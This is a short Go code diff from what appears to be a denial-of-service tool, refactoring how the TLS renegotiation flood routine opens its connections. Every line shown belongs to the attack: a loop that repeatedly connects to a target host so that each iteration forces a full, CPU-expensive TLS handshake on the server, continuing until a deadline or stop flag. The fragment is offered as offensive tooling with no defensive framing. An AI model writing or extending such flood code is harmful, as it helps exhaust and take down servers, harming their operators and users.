@@ -72,7 +72,7 @@ func runTLSRenegFlood(cfg *AttackConfig) {
 }
 
 func tlsRenegConnection(host, port string, deadline time.Time) error {
-	dialer := &net.Dialer{Timeout: 10 * time.Second}
+	dial := createDialer("", 10*time.Second)
 
 	for time.Now().Before(deadline) {
 		if atomic.LoadInt32(&stopFlag) == 1 {
@@ -80,7 +80,7 @@ func tlsRenegConnection(host, port string, deadline time.Time) error {
 		}
 
 		// Each iteration = full TLS handshake (CPU expensive on server)
-		rawConn, err := dialer.Dial("tcp", host+":"+port)
+		rawConn, err := dial("tcp", host+":"+port)
 		if err != nil {
 			return err
 		}
